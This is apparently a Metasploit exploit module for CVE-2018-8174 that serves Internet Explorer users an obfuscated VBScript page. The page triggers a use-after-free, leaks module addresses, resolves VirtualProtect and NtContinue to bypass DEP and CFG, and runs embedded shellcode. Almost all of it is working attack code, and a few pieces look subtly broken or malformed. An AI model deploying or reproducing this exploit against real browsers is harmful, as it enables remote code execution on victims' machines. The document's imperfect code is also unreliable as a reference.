##
# This module requires Metasploit: https://metasploit.com/download
# Current source: https://github.com/rapid7/metasploit-framework
##

class MetasploitModule < Msf::Exploit::Remote
    Rank = NormalRanking
  
    include Msf::Exploit::Remote::HttpServer
    include Msf::Exploit::EXE
    include Msf::Exploit::RopDb
    include Msf::Exploit::Remote::BrowserAutopwn

    def initialize(info = {})
        super(
          update_info(
            info,
            'Name'           => "CVE-2018-8174",
            'Description'    => %q{
              This module exploits using vbscript Code Execution (CVE-2018-8174)
            },
            'License'        => MSF_LICENSE,
            'Author'         => [
                'SMGORELIK',          # Original RE research and exploitation
                'Sungha Park'            # Metasploit module
              ],
            'Platform'       => 'win',
            'Targets'        =>
              [
                [ 'Automatic', {} ],
                [ 'IE11 on Windows 7', { } ],
                [ 'under IE10 on Windows 7', { } ]
              ],
            'References'     =>
              [
                [ 'CVE', '2018-8174' ]
              ],
            'Arch'           => ARCH_X64,
            'DisclosureDate' => "May 2018",
            'DefaultTarget'  => 0
          )
        )
    end

    def get_target(agent)
      return target if target.name != 'Automatic'
  
      nt = agent.scan(/Windows NT (\d+.\d*)/).flatten[0] || ''
      cm = agent.scan(/rv:(\d*.\d+)/).flatten[0] || ""
  
      cm_name = "IE #{cm}"

      case nt
      when '5.1'
        os_name = 'Windows XP SP3'
      when '6.0'
        os_name = 'Windows Vista'
      when '6.1'
        os_name = 'Windows 7'
      when '6.2'
        os_name = 'Windows 8'
      when '6.3'
        os_name = 'Windows 8.1'
      when '10.0'
        os_name = 'Windows 10'
      end
  
      targets.each do |t|
        # if (!cm.empty? && t.name.include?(cm_name)) && (!nt.empty? && t.name.include?(os_name))
        if ((!cm.empty? && t.name.include?(cm_name)) && (!nt.empty? && t.name.include?(os_name)))
        return t
        end
      end
  
      nil
    end
    
    def get_payload(t)
      # stack_pivot = "\x41\x42\x43\x44"
      # code        = payload.encoded
  
      # case t['Rop']
      # when :msvcrt
      #   print_status("Using msvcrt ROP")
      #   rop_payload = generate_rop_payload('msvcrt', code, 'pivot' => stack_pivot, 'target' => 'xp')
  
      # else
      #   print_status("Using JRE ROP")
      #   rop_payload = generate_rop_payload('java', code, 'pivot' => stack_pivot)
      # end
  
      # rop_payload
      rop_payload = "%u48fc%ue483%ue8f0%u00c0%u0000%u5141%u5041%u5152%u4856%ud231%u4865%u528b%u4860%u528b%u4818%u528b%u4820%u728b%u4850%ub70f%u4a4a%u314d%u48c9%uc031%u3cac%u7c61%u2c02%u4120%uc9c1%u410d%uc101%uede2%u4152%u4851%u528b%u8b20%u3c42%u0148%u8bd0%u8880%u0000%u4800%uc085%u6774%u0148%u50d0%u488b%u4418%u408b%u4920%ud001%u56e3%uff48%u41c9%u348b%u4888%ud601%u314d%u48c9%uc031%u41ac%uc9c1%u410d%uc101%ue038%uf175%u034c%u244c%u4508%ud139%ud875%u4458%u408b%u4924%ud001%u4166%u0c8b%u4448%u408b%u491c%ud001%u8b41%u8804%u0148%u41d0%u4158%u5e58%u5a59%u5841%u5941%u5a41%u8348%u20ec%u5241%ue0ff%u4158%u5a59%u8b48%ue912%uff57%uffff%u485d%u01ba%u0000%u0000%u0000%u4800%u8d8d%u0101%u0000%uba41%u8b31%u876f%ud5ff%uf0bb%ua2b5%u4156%ua6ba%ubd95%uff9d%u48d5%uc483%u3c28%u7c06%u800a%ue0fb%u0575%u47bb%u7213%u6a6f%u5900%u8941%uffda%u63d5%u6c61%u2e63%u7865%u0065"
      
      rop_payload
    end

    def pivotrop(t)
      pivotrop = ""
      #pivot rop..
      pivotrop
    end

    def xchgrop(t)
      xchgrop = ""
      #xchg rop..
      xchgrop
    end

    def get_html(t)
      # js_p = ::Rex::Text.to_unescape(get_payload(t), ::Rex::Arch.endian(t.arch))

      rop_payload = get_payload(t);
      pivotrop = pivotrop(t);
      xchgrop = xchgrop(t);
      shellcode_payload = payload.encoded();

      html = <<-HTML
	<!doctype html>
	<html lang="en">
	<head>
	<meta http-equiv="Content-Type" content="text/html; charset=UTF-8">
	<meta http-equiv="x-ua-compatible" content="IE=10">
	<meta http-equiv="Expires" content="0">
	<meta http-equiv="Pragma" content="no-cache">
	<meta http-equiv="Cache-control" content="no-cache">
	<meta http-equiv="Cache" content="no-cache">
	</head>
	<body>
	<script language="vbscript">
	Dim lIIl
	Dim IIIlI(6),IllII(6)
	Dim IllI
	Dim IIllI(40)
	Dim lIlIIl,lIIIll
	Dim IlII
	Dim llll,IIIIl
	Dim llllIl,IlIIII
	Dim NtContinueAddr,VirtualProtectAddr

	IlII=195948557
	lIlIIl=Unescape("%u0001%u0880%u0001%u0000%u0000%u0000%u0000%u0000%uffff%u7fff%u0000%u0000")
	lIIIll=Unescape("%u0000%u0000%u0000%u0000%u0000%u0000%u0000%u0000")
	IllI=195890093
	Function IIIII(Domain) 
		lIlII=0
		IllllI=0
		IIlIIl=0
		Id=CLng(Rnd*1000000)
		lIlII=CLng((&h27d+8231-&H225b)*Rnd)Mod (&h137d+443-&H152f)+(&h1c17+131-&H1c99)
		If(Id+lIlII)Mod (&h5c0+6421-&H1ed3)=(&h10ba+5264-&H254a) Then
			lIlII=lIlII-(&h86d+6447-&H219b)
		End If

		IllllI=CLng((&h2bd+6137-&H1a6d)*Rnd)Mod (&h769+4593-&H1940)+(&h1a08+2222-&H2255)
		IIlIIl=CLng((&h14e6+1728-&H1b5d)*Rnd)Mod (&hfa3+1513-&H1572)+(&h221c+947-&H256e)
		IIIII=Domain &"?" &Chr(IllllI) &"=" &Id &"&" &Chr(IIlIIl) &"=" &lIlII
	End Function

	Function lIIII(ByVal lIlIl)
		IIll=""
		For index=0 To Len(lIlIl)-1
			IIll=IIll &lIlI(Asc(Mid(lIlIl,index+1,1)),2)
		Next
		IIll=IIll &"00"
		If Len(IIll)/(&h15c6+3068-&H21c0) Mod (&h1264+2141-&H1abf)=(&hc93+6054-&H2438) Then
			IIll=IIll &"00"
		End If
		For IIIl=(&h1a1a+3208-&H26a2) To Len(IIll)/(&h1b47+331-&H1c8e)-(&h14b2+4131-&H24d4)
			lIIIlI=Mid(IIll,IIIl*(&h576+1268-&Ha66)+(&ha64+6316-&H230f),(&ha49+1388-&Hfb3))
			lIlIll=Mid(IIll,IIIl*(&hf82+3732-&H1e12)+(&h210+2720-&Hcaf)+(&h4fa+5370-&H19f2),(&hf82+5508-&H2504))
			lIIII=lIIII &"%u" &lIlIll &lIIIlI
		Next
	End Function
	Function lIlI(ByVal Number,ByVal Length)
		IIII=Hex(Number)
		If Len(IIII)<Length Then
			IIII=String(Length-Len(IIII),"0") &IIII    'pad allign with zeros 
		Else
			IIII=Right(IIII,Length)
		End If
		lIlI=IIII
	End Function
	Function GetUint32(lIII)
		Dim value
		llll.mem(IlII+8)=lIII+4
		llll.mem(IlII)=8		'type string
		value=llll.P0123456789
		llll.mem(IlII)=2
		GetUint32=value
	End Function
	Function IllIIl(lIII)
		IllIIl=GetUint32(lIII) And (131071-65536)
	End Function
	Function lllII(lIII)
		lllII=GetUint32(lIII)  And (&h17eb+1312-&H1c0c)
	End Function
	Sub llllll
	End Sub
	Function GetMemValue
		llll.mem(IlII)=(&h713+3616-&H1530)
		GetMemValue=llll.mem(IlII+(&h169c+712-&H195c))
	End Function
	Sub SetMemValue(ByRef IlIIIl)
		llll.mem(IlII+(&h715+3507-&H14c0))=IlIIIl
	End Sub
	Function LeakVBAddr
		On Error Resume Next
		Dim lllll
		lllll=llllll
		lllll=null
		SetMemValue lllll
		LeakVBAddr=GetMemValue()
	End Function
	Function GetBaseByDOSmodeSearch(IllIll)
		Dim llIl
		llIl=IllIll And &hffff0000
		Do While GetUint32(llIl+(&h748+4239-&H176f))<>544106784 Or GetUint32(llIl+(&ha2a+7373-&H268b))<>542330692
			llIl=llIl-65536
		Loop
		GetBaseByDOSmodeSearch=llIl
	End Function
	Function StrCompWrapper(lIII,llIlIl)
		Dim lIIlI,IIIl
		lIIlI=""
		For IIIl=(&ha2a+726-&Hd00) To Len(llIlIl)-(&h2e1+5461-&H1835)
			lIIlI=lIIlI &Chr(lllII(lIII+IIIl))
		Next
		StrCompWrapper=StrComp(UCase(lIIlI),UCase(llIlIl))
	End Function
	Function GetBaseFromImport(base_address,name_input)
		Dim import_rva,nt_header,descriptor,import_dir
		Dim IIIIII
		nt_header=GetUint32(base_address+(&h3c))
		import_rva=GetUint32(base_address+nt_header+&h80)
		import_dir=base_address+import_rva
		descriptor=0
		Do While True
			Dim Name
			Name=GetUint32(import_dir+descriptor*(&h14)+&hc)
			If Name=0 Then
				GetBaseFromImport=&hBAAD0000
				Exit Function
			Else
				If StrCompWrapper(base_address+Name,name_input)=0 Then
					Exit Do
				End If
			End If
			descriptor=descriptor+1
		Loop
		IIIIII=GetUint32(import_dir+descriptor*(&h14)+&h10)
		GetBaseFromImport=GetBaseByDOSmodeSearch(GetUint32(base_address+IIIIII))
	End Function

	Function GetProcAddr(dll_base,name)
		Dim p,export_dir,index
		Dim function_rvas,function_names,function_ordin
		Dim Illlll
		p=GetUint32(dll_base+&h3c)
		p=GetUint32(dll_base+p+&h78)
		export_dir=dll_base+p

		function_rvas=dll_base+GetUint32(export_dir+&h1c)
		function_names=dll_base+GetUint32(export_dir+&h20)
		function_ordin=dll_base+GetUint32(export_dir+&h24)
		index=0
		Do While True
			Dim lllI
			lllI=GetUint32(function_names+index*4)
			If StrCompWrapper(dll_base+lllI,name)=0 Then
				Exit Do
			End If
			index=index+1
		Loop
		Illlll=IllIIl(function_ordin+index*2)
		p=GetUint32(function_rvas+Illlll*4)
		GetProcAddr=dll_base+p
	End Function

	Function GetShellcode()
		IIlI=Unescape("%u0000%u0000%u0000%u0000") &Unescape("#{rop_payload}" &lIIII(IIIII("")))
		IIlI=IIlI & String((&h80000-LenB(IIlI))/2,Unescape("%u4141"))
		GetShellcode=IIlI
	End Function
	Function EscapeAddress(ByVal value)
		Dim High,Low
		High=lIlI((value And &hffff0000)/&h10000,4)
		Low=lIlI(value And &hffff,4)
		EscapeAddress=Unescape("%u" &Low &"%u" &High)
	End Function
	Function lIllIl
		Dim IIIl,IlllI,IIlI,IlIII,llllI,llIII,lIllI
		IlllI=lIlI(NtContinueAddr,8)
		IlIII=Mid(IlllI,1,2)
		llllI=Mid(IlllI,3,2)
		llIII=Mid(IlllI,5,2)
		lIllI=Mid(IlllI,7,2)
		IIlI=""
		IIlI=IIlI &"%u0000%u" &lIllI &"00"
		For IIIl=1 To 3
			IIlI=IIlI &"%u" &llllI &llIII
			IIlI=IIlI &"%u" &lIllI &IlIII
		Next
		IIlI=IIlI &"%u" &llllI &llIII
		IIlI=IIlI &"%u00" &IlIII
		lIllIl=Unescape(IIlI)
	End Function
	Function WrapShellcodeWithNtContinueContext(ShellcodeAddrParam) 'bypass cfg
		Dim IIlI
		IIlI=String((100334-65536),Unescape("%u4141"))
		IIlI=IIlI &EscapeAddress(ShellcodeAddrParam)
		IIlI=IIlI &EscapeAddress(ShellcodeAddrParam)
		IIlI=IIlI &EscapeAddress(&h3000)
		IIlI=IIlI &EscapeAddress(&h40)
		IIlI=IIlI &EscapeAddress(ShellcodeAddrParam-8)
		IIlI=IIlI &String(6,Unescape("%u4242"))
		IIlI=IIlI &lIllIl()
		IIlI=IIlI &String((&h80000-LenB(IIlI))/2,Unescape("%u4141"))
		WrapShellcodeWithNtContinueContext=IIlI
	End Function
	Function ExpandWithVirtualProtect(lIlll)
		Dim IIlI
		Dim lllllI
		lllllI=lIlll+&h23
		IIlI=""
		IIlI=IIlI &EscapeAddress(lllllI)
		IIlI=IIlI &String((&hb8-LenB(IIlI))/2,Unescape("%4141"))
		IIlI=IIlI &EscapeAddress(VirtualProtectAddr)
		IIlI=IIlI &EscapeAddress(&h1b)
		IIlI=IIlI &EscapeAddress(0)
		IIlI=IIlI &EscapeAddress(lIlll)
		IIlI=IIlI &EscapeAddress(&h23)
		IIlI=IIlI &String((&400-LenB(IIlI))/2,Unescape("%u4343"))
		ExpandWithVirtualProtect=IIlI
	End Function
	Sub ExecuteShellcode
		llll.mem(IlII)=&h4d 'DEP bypass
		llll.mem(IlII+8)=0
		msgbox(IlII)		'VT replaced
	End Sub

	Class cla1
	Private Sub Class_Terminate()
		Set IIIlI(IllI)=lIIl((&h1078+5473-&H25d8))
		IllI=IllI+(&h14b5+2725-&H1f59)
		lIIl((&h79a+3680-&H15f9))=(&h69c+1650-&Hd0d)
	End Sub

	End Class

	Class cla2
	Private Sub Class_Terminate()
		Set IllII(IllI)=lIIl((&h15b+3616-&Hf7a))
		IllI=IllI+(&h880+542-&Ha9d)
		lIIl((&h1f75+342-&H20ca))=(&had3+3461-&H1857)
	End Sub
	End Class

	Class IIIlIl
	End Class

	Class llIIl
	Dim mem
	Function P
	End Function
	Function SetProp(Value)
		mem=Value
		SetProp=0
	End Function
	End Class

	Class IIIlll
	Dim mem
	Function P0123456789
		P0123456789=LenB(mem(IlII+8))
	End Function
	Function SPP
	End Function
	End Class

	Class lllIIl
	Public Default Property Get P
	Dim llII
	P=174088534690791e-324
	For IIIl=(&h7a0+4407-&H18d7) To (&h2eb+1143-&H75c)
		IIIlI(IIIl)=(&h2176+711-&H243d)
	Next
	Set llII=New IIIlll
	llII.mem=lIlIIl
	For IIIl=(&h1729+3537-&H24fa) To (&h1df5+605-&H204c)
		Set IIIlI(IIIl)=llII
	Next
	End Property
	End Class

	Class llllII
	Public Default Property Get P
	Dim llII
	P=636598737289582e-328
	For IIIl=(&h1063+2314-&H196d) To (&h4ac+2014-&Hc84)
		IllII(IIIl)=(&h442+2598-&He68)
	Next
	Set llII=New IIIlll
	llII.mem=lIIIll
	For IIIl=(&h7eb+3652-&H162f) To (&h3e8+1657-&Ha5b)
		Set IllII(IIIl)=llII
	Next
	End Property
	End Class

	Set llllIl=New lllIIl
	Set IlIIII=New llllII
	Sub UAF
		For IIIl=(&hfe8+3822-&H1ed6) To (&h8b+8633-&H2233)
			Set IIllI(IIIl)=New IIIlIl
		Next
		For IIIl=(&haa1+6236-&H22e9) To (&h1437+3036-&H1fed)
			Set IIllI(IIIl)=New llIIl
		Next
		IllI=0
		For IIIl=0 To 6
			ReDim lIIl(1)
			Set lIIl(1)=New cla1
			Erase lIIl
		Next
		Set llll=New llIIl
		IllI=0
		For IIIl=0 To 6
			ReDim lIIl(1)
			Set lIIl(1)=New cla2
			Erase lIIl
		Next
		Set IIIIl=New llIIl
	End Sub
	Sub InitObjects
		llll.SetProp(llllIl)
		IIIIl.SetProp(IlIIII)
		IlII=IIIIl.mem
	End Sub

	Sub StartExploit
		UAF
		InitObjects
		vb_adrr=LeakVBAddr()
		Alert "CScriptEntryPointObject Leak: 0x" & Hex(vb_adrr) & vbcrlf & "VirtualTable address: 0x" & Hex(GetUint32(vb_adrr))
		vbs_base=GetBaseByDOSmodeSearch(GetUint32(vb_adrr))
		Alert "VBScript Base: 0x" & Hex(vbs_base) 
		msv_base=GetBaseFromImport(vbs_base,"msvcrt.dll")
		Alert "MSVCRT Base: 0x" & Hex(msv_base) 
		krb_base=GetBaseFromImport(msv_base,"kernelbase.dll")
		Alert "KernelBase Base: 0x" & Hex(krb_base) 
		ntd_base=GetBaseFromImport(msv_base,"ntdll.dll")
		Alert "Ntdll Base: 0x" & Hex(ntd_base) 
		VirtualProtectAddr=GetProcAddr(krb_base,"VirtualProtect")
		Alert "KernelBase!VirtualProtect Address 0x" & Hex(VirtualProtectAddr) 
		NtContinueAddr=GetProcAddr(ntd_base,"NtContinue")
		Alert "KernelBase!VirtualProtect Address 0x" & Hex(NtContinueAddr) 
		SetMemValue GetShellcode()
		ShellcodeAddr=GetMemValue()+8
		Alert "Shellcode Address 0x" & Hex(ShellcodeAddr) 
		SetMemValue WrapShellcodeWithNtContinueContext(ShellcodeAddr)
		lIlll=GetMemValue()+69596
		SetMemValue ExpandWithVirtualProtect(lIlll)
		llIIll=GetMemValue()
		Alert "Executing Shellcode"
		ExecuteShellcode
	End Sub
	StartExploit
	</script>
	</body>
	</html>
      HTML

      html.gsub(/^\t\t/, '')
    end

    def on_request_uri(cli, request)
      agent = request.headers['User-Agent']
      print_status("Requesting: #{request.uri}")
  
      target = get_target(agent)
      if target.nil?
        print_error("Browser not supported, sending 404: #{agent}")
        send_not_found(cli)
        return
      end
  
      print_status("Target selected as: #{target.name}")
      html = get_html(target)
      send_response(cli, html, 'Content-Type' => 'text/html', 'Cache-Control' => 'no-cache')
    end

end
